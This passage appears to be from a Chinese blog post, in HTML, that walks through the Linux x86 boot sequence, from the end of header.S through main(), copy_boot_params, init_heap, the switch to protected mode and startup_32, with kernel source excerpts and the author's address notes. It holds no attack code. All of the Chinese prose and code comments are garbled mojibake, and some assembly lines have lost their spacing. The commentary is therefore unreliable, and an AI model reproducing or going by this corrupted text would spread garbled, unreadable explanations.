åŒæ­¥cså’Œå…¶ä»–æ®µå¯„å­˜å™¨ï¼Œæ­¤æ—¶csä¸º0x1020ï¼Œå…¶ä»–æ®µå¯„å­˜å™¨ä¸º0x1000<br>pushw%ds<br>pushw$6f<br>lretw# lretwå°†6çš„åœ°å€æ”¾å…¥ripï¼Œå°†dså¯„å­˜å™¨çš„å€¼æ”¾å…¥cså¯„å­˜å™¨ï¼Œcså¯„å­˜å™¨åŒæ­¥0x1000<br>6:<br><br># æ£€æŸ¥ç­¾å<br>cmpl$0x5a5aaa55, setup_sig<br>jnesetup_bad<br><br># æ¸…ç©ºbssæ®µ<br>movw$__bss_start, %di<br>movw$_end+3, %cx<br>xorl%eax, %eax<br>subw%di, %cx<br>shrw$2, %cx<br>rep; stosl<br><br># è·³è½¬è‡³mainå‡½æ•°<br>calllmain<br><br># Setup corrupt somehow...<br>setup_bad:<br>movl$setup_corrupt, %eax<br>calllputs<br># Fall through...<br><br>.globldie<br>.typedie, @function<br>die:<br>hlt<br>jmpdie<br><br>.sizedie, .-die<br><br>.section &quot;.initdata&quot;, &quot;a&quot;<br>setup_corrupt:<br>.byte7<br>.string&quot;No setup signature found...\n&quot;<br></code></pre></td></tr></table></figure><p>è¿™æ®µä»£ç ç»“æŸå</p><ul><li>spï¼š0xfff0</li><li>__bss_startï¼š0x13c00</li><li>_endï¼š0x14f10</li></ul><h1 id="main"><a href="#main" class="headerlink" title="main"></a>main</h1><p>mainå‡½æ•°çš„ä¸»è¦åŠŸèƒ½ä¸º</p><ul><li>åˆå§‹åŒ–consoleã€heap</li><li>æ£€æµ‹å†…å­˜ã€CPUéªŒè¯ã€é”®ç›˜åˆå§‹åŒ–</li><li>è¿›å…¥ä¿æŠ¤æ¨¡å¼</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//arch\x86\boot\main.c</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* å°†boot headerå¤åˆ¶åˆ°zeropageä¸­ */</span><br>copy_boot_params();<br><br><span class="hljs-comment">/* åˆå§‹åŒ–æ—©æœŸå¯åŠ¨çŠ¶æ€ä¸‹çš„æ§åˆ¶å° */</span><br>console_init();<br><span class="hljs-keyword">if</span> (cmdline_find_option_bool(<span class="hljs-string">&quot;debug&quot;</span>))<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;early console in setup code\n&quot;</span>);<br><br><span class="hljs-comment">/* åˆå§‹åŒ–å † */</span><br>init_heap();<br><br><span class="hljs-comment">/* æ£€æµ‹ CPU ç›¸å…³ä¿¡æ¯ */</span><br><span class="hljs-keyword">if</span> (validate_cpu()) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Unable to boot - please use a kernel appropriate &quot;</span><br>     <span class="hljs-string">&quot;for your CPU.\n&quot;</span>);<br>die();<br>&#125;<br><br><span class="hljs-comment">/* é€šè¿‡å‘ BIOS æŸ¥è¯¢çš„æ–¹å¼ï¼Œæ”¶é›†ç¡¬ä»¶ç›¸å…³ä¿¡æ¯ï¼Œå¹¶å°†ç»“æœå­˜æ”¾åœ¨zeropageä¸­ */</span><br>set_bios_mode();<br><br><span class="hljs-comment">/* ä»BIOSå¤„æ”¶é›†å†…å­˜ä¿¡æ¯ï¼ŒåŒ…æ‹¬å†…å­˜æ®µèµ·å§‹ã€å†…å­˜æ®µå¤§å°ã€å†…å­˜æ®µç±»å‹ç­‰ */</span><br>detect_memory();<br><br><span class="hljs-comment">/* åˆå§‹åŒ–é”®ç›˜ */</span><br>keyboard_init();<br><br><span class="hljs-comment">/* è¯¢é—®IST */</span><br>query_ist();<br><br><span class="hljs-comment">/* è¯¢é—®APM */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_APM) || defined(CONFIG_APM_MODULE)</span><br>query_apm_bios();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* è¯¢é—®EDD */</span><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> defined(CONFIG_EDD) || defined(CONFIG_EDD_MODULE)</span><br>query_edd();<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">/* è®¾ç½®æ˜¾ç¤ºæ¨¡å¼ */</span><br>set_video();<br><br><span class="hljs-comment">/* åˆ‡æ¢ä¿æŠ¤æ¨¡å¼ */</span><br>go_to_protected_mode();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="copy-boot-params"><a href="#copy-boot-params" class="headerlink" title="copy_boot_params"></a>copy_boot_params</h2><p>copy_boot_paramsä¸»è¦å®Œæˆï¼š</p><ul><li>å°†hdrçš„å†…å®¹å¤åˆ¶ç»™boot_paramsï¼š0x13ef0</li><li>å¦‚æœä½¿ç”¨çš„æ˜¯æ—§çš„command lineåˆ™å°†å…¶å¤åˆ¶åˆ°0x9000</li><li>æ›´æ–°boot_params.cmd_line_ptr</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">copy_boot_params</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">old_cmdline</span> &#123;</span><br>u16 cl_magic;<br>u16 cl_offset;<br>&#125;;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">old_cmdline</span> * <span class="hljs-title">const</span> <span class="hljs-title">oldcmd</span> =</span><br>(<span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> old_cmdline *)OLD_CL_ADDRESS;<br><br>BUILD_BUG_ON(<span class="hljs-keyword">sizeof</span> boot_params != <span class="hljs-number">4096</span>);<br><span class="hljs-built_in">memcpy</span>(&amp;boot_params.hdr, &amp;hdr, <span class="hljs-keyword">sizeof</span> hdr);<br><br><span class="hljs-keyword">if</span> (!boot_params.hdr.cmd_line_ptr &amp;&amp;<br>    oldcmd-&gt;cl_magic == OLD_CL_MAGIC) &#123;<br><span class="hljs-comment">/* Old-style command line protocol. */</span><br>u16 cmdline_seg;<br><br><span class="hljs-comment">/* Figure out if the command line falls in the region</span><br><span class="hljs-comment">   of memory that an old kernel would have copied up</span><br><span class="hljs-comment">   to 0x90000... */</span><br><span class="hljs-keyword">if</span> (oldcmd-&gt;cl_offset &lt; boot_params.hdr.setup_move_size)<br>cmdline_seg = ds();<br><span class="hljs-keyword">else</span><br>cmdline_seg = <span class="hljs-number">0x9000</span>;<br><br>boot_params.hdr.cmd_line_ptr =<br>(cmdline_seg &lt;&lt; <span class="hljs-number">4</span>) + oldcmd-&gt;cl_offset;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><em><strong>psï¼š</strong></em></p><ul><li><p><em>hdrçš„åœ°å€ä¸º0x1f1ï¼Œhdrå’Œboot_paramsçš„åœ°å€éƒ½å¯ä»¥é€šè¿‡è°ƒè¯•å¾—åˆ°ï¼ˆå®šä½å†…å­˜å¤åˆ¶çš„å‘½ä»¤ï¼‰</em></p></li><li><p><em>hdrç»“æ„å®šä¹‰åœ¨header.Sæ–‡ä»¶ä¸­</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.globlhdr<br>hdr:<br>setup_sects:.byte 0/* Filled in by build.c */<br>root_flags:.word ROOT_RDONLY<br>syssize:.long 0/* Filled in by build.c */<br>ram_size:.word 0/* Obsolete */<br>vid_mode:.word SVGA_MODE<br>root_dev:.word 0/* Filled in by build.c */<br>boot_flag:.word 0xAA55<br></code></pre></td></tr></table></figure><p><em><strong>mdè¿™ç ´ç©æ„æˆ‘çº ç»“äº†ä¸€ä¸‹åˆ</strong></em></p></li></ul><h2 id="init-heap"><a href="#init-heap" class="headerlink" title="init_heap"></a>init_heap</h2><p>è°ƒè¯•çœ‹boot_paramsç»“æ„ä½“å¯ä»¥çœ‹å‡ºheap_end:0xfe00</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">init_heap</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-type">char</span> *stack_end;<br><br><span class="hljs-keyword">if</span> (boot_params.hdr.loadflags &amp; CAN_USE_HEAP) &#123;<br><span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;leal %P1(%%esp),%0&quot;</span><br>    : <span class="hljs-string">&quot;=r&quot;</span> (stack_end) : <span class="hljs-string">&quot;i&quot;</span> (-STACK_SIZE));<br><br>heap_end = (<span class="hljs-type">char</span> *)<br>((<span class="hljs-type">size_t</span>)boot_params.hdr.heap_end_ptr + <span class="hljs-number">0x200</span>);<br><span class="hljs-keyword">if</span> (heap_end &gt; stack_end)<br>heap_end = stack_end;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-comment">/* Boot protocol 2.00 only, no heap available */</span><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;WARNING: Ancient bootloader, some functionality &quot;</span><br>     <span class="hljs-string">&quot;may be limited!\n&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="go-to-protected-mode"><a href="#go-to-protected-mode" class="headerlink" title="go_to_protected_mode"></a>go_to_protected_mode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">go_to_protected_mode</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* ç¦æ­¢ä¸­æ–­ */</span><br>realmode_switch_hook();<br><br><span class="hljs-comment">/* å¯åŠ¨A20 */</span><br><span class="hljs-keyword">if</span> (enable_a20()) &#123;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;A20 gate not responding, unable to boot...\n&quot;</span>);<br>die();<br>&#125;<br><br>reset_coprocessor();<br><br><span class="hljs-comment">/* é…ç½®ä¸­æ–­ */</span><br>mask_all_interrupts();<br><br><span class="hljs-comment">/* é…ç½®idtå’Œgdtè¡¨ï¼Œè½¬æ¢è‡³ä¿æŠ¤æ¨¡å¼ */</span><br>setup_idt();<br>setup_gdt();<br>protected_mode_jump(boot_params.hdr.code32_start,<br>    (u32)&amp;boot_params + (ds() &lt;&lt; <span class="hljs-number">4</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>gdtåŸºå€éƒ½ä¸º0</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">setup_gdt</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">/* There are machines which are known to not boot with the GDT</span><br><span class="hljs-comment">   being 8-byte unaligned.  Intel recommends 16 byte alignment. */</span><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> u64 boot_gdt[] __attribute__((aligned(<span class="hljs-number">16</span>))) = &#123;<br><span class="hljs-comment">/* CS: code, read/execute, 4 GB, base 0 */</span><br>[GDT_ENTRY_BOOT_CS] = GDT_ENTRY(<span class="hljs-number">0xc09b</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xfffff</span>),<br><span class="hljs-comment">/* DS: data, read/write, 4 GB, base 0 */</span><br>[GDT_ENTRY_BOOT_DS] = GDT_ENTRY(<span class="hljs-number">0xc093</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0xfffff</span>),<br><span class="hljs-comment">/* TSS: 32-bit tss, 104 bytes, base 4096 */</span><br><span class="hljs-comment">/* We only have a TSS here to keep Intel VT happy;</span><br><span class="hljs-comment">   we don&#x27;t actually use it for anything. */</span><br>[GDT_ENTRY_BOOT_TSS] = GDT_ENTRY(<span class="hljs-number">0x0089</span>, <span class="hljs-number">4096</span>, <span class="hljs-number">103</span>),<br>&#125;;<br><span class="hljs-comment">/* Xen HVM incorrectly stores a pointer to the gdt_ptr, instead</span><br><span class="hljs-comment">   of the gdt_ptr contents.  Thus, make it static so it will</span><br><span class="hljs-comment">   stay in memory, at least long enough that we switch to the</span><br><span class="hljs-comment">   proper kernel GDT. */</span><br><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">gdt_ptr</span> <span class="hljs-title">gdt</span>;</span><br><br>gdt.len = <span class="hljs-keyword">sizeof</span>(boot_gdt)<span class="hljs-number">-1</span>;<br>gdt.ptr = (u32)&amp;boot_gdt + (ds() &lt;&lt; <span class="hljs-number">4</span>);<br><br><span class="hljs-keyword">asm</span> <span class="hljs-title function_">volatile</span><span class="hljs-params">(<span class="hljs-string">&quot;lgdtl %0&quot;</span> : : <span class="hljs-string">&quot;m&quot;</span> (gdt))</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿›å…¥ä¿æŠ¤æ¨¡å¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly">GLOBAL(protected_mode_jump)<br>movl%edx, %esi# æŒ‡å‘boot_params<br><br>xorl%ebx, %ebx<br>movw%cs, %bx<br>shll$4, %ebx<br>addl%ebx, 2f<br>jmp1f# Short jump to serialize on 386/486<br>1:<br><br>movw$__BOOT_DS, %cx<br>movw$__BOOT_TSS, %di<br><br>movl%cr0, %edx<br>orb$X86_CR0_PE, %dl# è°ƒæ•´è‡³ä¿æŠ¤æ¨¡å¼ï¼ˆæ›´æ”¹cr0ï¼‰<br>movl%edx, %cr0<br><br># é•¿è·³è½¬è¿›å…¥ä¿æŠ¤æ¨¡å¼<br>.byte0x66, 0xea# ljmpl opcode<br>2:.longin_pm32# offset<br>.word__BOOT_CS# segment<br>ENDPROC(protected_mode_jump)<br><br>.code32<br>.section &quot;.text32&quot;,&quot;ax&quot;<br>GLOBAL(in_pm32)<br># å»ºç«‹32ä½çš„dataæ®µ<br>movl%ecx, %ds<br>movl%ecx, %es<br>movl%ecx, %fs<br>movl%ecx, %gs<br>movl%ecx, %ss<br># å»ºç«‹ä¿æŠ¤æ¨¡å¼æ ˆ<br>addl%ebx, %esp<br><br># è®¾ç½®TRä»¥ä½¿Intel VTæ­£å¸¸å·¥<br>ltr%di<br><br># æ¸…ç©ºå¯„å­˜å™¨<br>xorl%ecx, %ecx<br>xorl%edx, %edx<br>xorl%ebx, %ebx<br>xorl%ebp, %ebp<br>xorl%edi, %edi<br><br># è®¾ç½®LDTRä»¥ä½¿Intel VTæ­£å¸¸å·¥ä½œ<br>lldt%cx<br><br>jmpl*%eax# Jump to the 32-bit entrypoint<br>ENDPROC(in_pm32)<br></code></pre></td></tr></table></figure><p>ä¹‹åå‡½æ•°æµç¨‹è·³è½¬åˆ°0x100000:startup_32</p><h1 id="startup-32"><a href="#startup-32" class="headerlink" title="startup_32"></a>startup_32</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ENTRY(startup_32)<br><br>cld<br>testb $KEEP_SEGMENTS, BP_loadflags(%esi)<br>jnz 1f<br><br>cli<br>movl$(__BOOT_DS), %eax<br>movl%eax, %ds<br>movl%eax, %es<br>movl%eax, %ss<br>1:<br><br>/*<br> * é•¿æ¨¡å¼æ”¯æŒripç›¸å¯¹å¯»å€ä½†ä¿æŠ¤æ¨¡å¼ä¸æ”¯æŒï¼Œæ‰€ä»¥éœ€è¦è®¡ç®—ç¼–è¯‘åœ°å€å’Œå®é™…è¿è¡Œåœ°å€åå·®ï¼ˆç¼–è¯‘åœ°å€ä¸º0ï¼‰<br> * æ­¤æ—¶esiä¸­æ˜¯boot_paramsçš„åœ°å€ï¼Œä¹‹å‰å·²ç»å¡«å……è¿‡äº†<br> * boot_params.hdrä¸­åŒ…å«ä¸€ä¸ªæˆå‘˜scratchï¼ˆåç§»é‡ä¸º0x1e4ï¼‰<br> */<br>leal(BP_scratch+4)(%esi), %esp# scratchç©ºé—´æˆä¸ºcallæŒ‡ä»¤çš„ä¸´æ—¶æ ˆï¼ˆ+4æ˜¯å› ä¸ºæ ˆä»ä¸Šå¾€ä¸‹å¢é•¿ï¼‰<br>call1f# espçš„å€¼å­˜å…¥æ ˆé¡¶ebpï¼Œ1çš„åœ°å€ï¼ˆè¿”å›åœ°å€ï¼‰è¢«å…¥æ ˆï¼ˆscratchï¼‰<br>1:popl%ebp# 1çš„åœ°å€å­˜å…¥ebp<br>subl$1b, %ebp#è®¡ç®—å·®å€¼<br><br>/* å»ºç«‹æ ˆå¹¶ç¡®ä¿cpuæ”¯æŒ64ä½ */<br>movl$boot_stack_end, %eax<br>addl%ebp, %eax<br>movl%eax, %esp<br><br>callverify_cpu<br>testl%eax, %eax<br>jnzno_longmode<br><br>/*<br> * è®¡ç®—å†…æ ¸è§£å‹åœ°å€<br> */<br><br>#ifdef CONFIG_RELOCATABLE<br>movl%ebp, %ebx# å°†startup_32åŸºå€æ”¾å…¥ebx<br>movlBP_kernel_alignment(%esi), %eax# å°†boot_params.hdr-&gt;kernel_alignmentæ”¾å…¥eax<br>decl%eax# eax--<br>addl%eax, %ebx# ebx+=eax<br>notl%eax# eax=~eax<br>andl%eax, %ebx# ebx~=eax<br>cmpl$LOAD_PHYSICAL_ADDR, %ebx# ä»¥ä¸Šæ­¥éª¤å°±æ˜¯ä¸ºäº†å¯¹é½<br>jge1f<br>#endif<br>movl$LOAD_PHYSICAL_ADDR, %ebx<br>1:<br><br>/* é‡å®šä½åœ°å€å‡†å¤‡è§£å‹ */<br>movlBP_init_size(%esi), %eax# eax=boot_params.hdr-&gt;init_size<br>subl$_end, %eax# eax-=_end<br>addl%eax, %ebx# ebx+=eaxï¼ˆé‡å®šä½ç‰©ç†åœ°å€ï¼‰<br><br>/*<br> * å‡†å¤‡è¿›å…¥64ä½æ¨¡å¼<br> */<br><br>/* æ›´æ–°gdt */<br>addl%ebp, gdt+2(%ebp)<br>lgdtgdt(%ebp)<br><br>/* å¼€å¯PAE */<br>movl%cr4, %eax<br>orl$X86_CR4_PAE, %eax<br>movl%eax, %cr4<br><br> /*<br>  * å»ºç«‹æ˜ å°„4Gå†…å­˜çš„é¡µè¡¨<br>  */<br>/*<br> * é¡µè¡¨åŠ å¯†ï¼ˆï¼Ÿï¼‰<br> */<br>callget_sev_encryption_bit<br>xorl%edx, %edx<br>testl%eax, %eax<br>jz1f<br>subl$32, %eax/* Encryption bit is always above bit 31 */<br>bts%eax, %edx/* Set encryption mask for page tables */<br>1:<br><br>/* æ¸…ç©ºé¡µè¡¨:0x2bec000-0x2bf2000 */<br>lealpgtable(%ebx), %edi<br>xorl%eax, %eax<br>movl$(BOOT_INIT_PGT_SIZE/4), %ecx<br>repstosl<br><br>/* Build Level 4 */<br>lealpgtable + 0(%ebx), %edi<br>leal0x1007 (%edi), %eax<br>movl%eax, 0(%edi)<br>addl%edx, 4(%edi)<br><br>/* Build Level 3 */<br>lealpgtable + 0x1000(%ebx), %edi<br>leal0x1007(%edi), %eax<br>movl$4, %ecx<br>1:movl%eax, 0x00(%edi)<br>addl%edx, 0x04(%edi)<br>addl$0x00001000, %eax<br>addl$8, %edi<br>decl%ecx<br>jnz1b<br><br>/* Build Level 2 */<br>lealpgtable + 0x2000(%ebx), %edi<br>movl$0x00000183, %eax<br>movl$2048, %ecx<br>1:movl%eax, 0(%edi)<br>addl%edx, 4(%edi)<br>addl$0x00200000, %eax<br>addl$8, %edi<br>decl%ecx<br>jnz1b<br><br>/* å°†PML4çš„åœ°å€æ”¾å…¥cr3 */<br>lealpgtable(%ebx), %eax<br>movl%eax, %cr3<br><br>/* å¼€å¯é•¿æ¨¡å¼EFER */<br>movl$MSR_EFER, %ecx<br>rdmsr<br>btsl$_EFER_LME, %eax<br>wrmsr<br><br>/* After gdt is loaded */<br>xorl%eax, %eax<br>lldt%ax<br>movl    $__BOOT_TSS, %eax<br>ltr%ax<br><br>/*<br> * å‡†å¤‡è¿›å…¥é•¿æ¨¡å¼<br> */<br>pushl$__KERNEL_CS<br>lealstartup_64(%ebp), %eax<br>#ifdef CONFIG_EFI_MIXED<br>movlefi32_config(%ebp), %ebx<br>cmp$0, %ebx<br>jz1f<br>lealhandover_entry(%ebp), %eax<br>1:<br>#endif<br>pushl%eax<br><br>/* å¯ç”¨åˆ†é¡µ */<br>movl$(X86_CR0_PG | X86_CR0_PE), %eax /* Enable Paging and Protected mode */<br>movl%eax, %cr0<br><br>/* Jump from 32bit compatibility mode into 64bit mode. */<br>lret<br>ENDPROC(startup_32)<br></code></pre></td></tr></table></figure><p>ä¸€äº›å˜é‡å’Œå®å®šä¹‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> BLANK() asm volatile(<span class="hljs-string">&quot;\n.ascii \&quot;-&gt;\&quot;&quot;</span> : : )</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OFFSET(sym, str, mem) \</span><br><span class="hljs-meta">DEFINE(sym, offsetof(struct str, mem))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEFINE(sym, val) \</span><br><span class="hljs-meta">asm volatile(<span class="hljs-string">&quot;\n.ascii \&quot;-&gt;&quot;</span> #sym <span 